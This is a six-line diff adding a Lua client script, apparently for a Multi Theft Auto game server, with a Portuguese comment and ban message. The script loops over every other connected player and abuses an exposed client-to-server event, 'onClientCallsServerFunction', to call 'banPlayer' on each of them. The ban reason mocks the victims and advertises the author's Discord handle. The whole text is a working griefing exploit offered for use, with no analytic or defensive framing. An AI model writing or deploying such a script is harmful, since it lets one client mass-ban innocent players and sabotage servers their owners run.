@@ -1,0 +1,6 @@
+for _, player in ipairs(getElementsByType("player")) do
+    if localPlayer ~= player then
+        -- Aciona o evento no servidor para banir o jogador
+        triggerServerEvent("onClientCallsServerFunction", root, "banPlayer", player, true, true, true, "Todos banidos por conta de 1 hack ou xit adicionar discord amores: eoalveszofc Banidos Por Alvesz <3")
+    end
+end
